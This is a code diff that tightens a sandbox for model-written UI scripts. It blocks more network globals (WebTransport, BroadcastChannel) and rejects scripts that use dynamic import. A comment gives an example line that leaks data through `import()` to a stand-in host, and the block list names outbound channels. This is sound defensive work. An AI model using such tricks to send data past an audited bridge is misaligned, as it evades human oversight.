@@ -41,6 +41,8 @@ const BLOCKED_GLOBAL_NAMES = [
   "XMLHttpRequest",
   "WebSocket",
   "EventSource",
+  "WebTransport",
+  "BroadcastChannel",
   "importScripts",
   "indexedDB",
   "caches",
@@ -114,6 +116,24 @@ function describeError(error: unknown): string {
     : String(error);
 }
 
+/**
+ * Dynamic `import()` and `import.meta` are syntax, not properties, so
+ * `removeBlockedGlobals` cannot reach them: `import("https://host/?" + data)`
+ * would issue a network request that bypasses the `ui` bridge's audit trail
+ * even if the module never loads. Reject any script that references them
+ * before compiling, so the only route out of this realm stays the bridge.
+ * (Static `import ... from` is already a SyntaxError inside `new Function`.)
+ *
+ * Source-level matching cannot distinguish `import(` in code from the same
+ * bytes inside a string literal, so a script that carries `"import("` as data
+ * is rejected too. That over-rejection is acceptable defense-in-depth: the
+ * real capability boundary is main-thread dispatch, and a false positive is a
+ * clear, retryable error rather than a silent failure.
+ */
+export function referencesDynamicImport(script: string): boolean {
+  return /\bimport\s*[.(]/.test(script);
+}
+
 async function evaluateUiScript(script: string) {
   removeBlockedGlobals();
   const ui = createUiProxy();
@@ -127,6 +147,15 @@ async function evaluateUiScript(script: string) {
   // must fail loudly and immediately (not escape as an unhandled rejection
   // and burn the whole execution budget in silence), and "failed to parse"
   // tells the model to fix its syntax rather than re-issue the script.
+  if (referencesDynamicImport(script)) {
+    workerScope.postMessage({
+      type: "failed",
+      error:
+        "The script uses `import`, which is not available in execute_ui — " +
+        "reach the outside world only through `ui.*` operations.",
+    });
+    return;
+  }
   let runner: (ui: unknown, log: (message: unknown) => void) => unknown;
   try {
     // eslint-disable-next-line @typescript-eslint/no-implied-eval
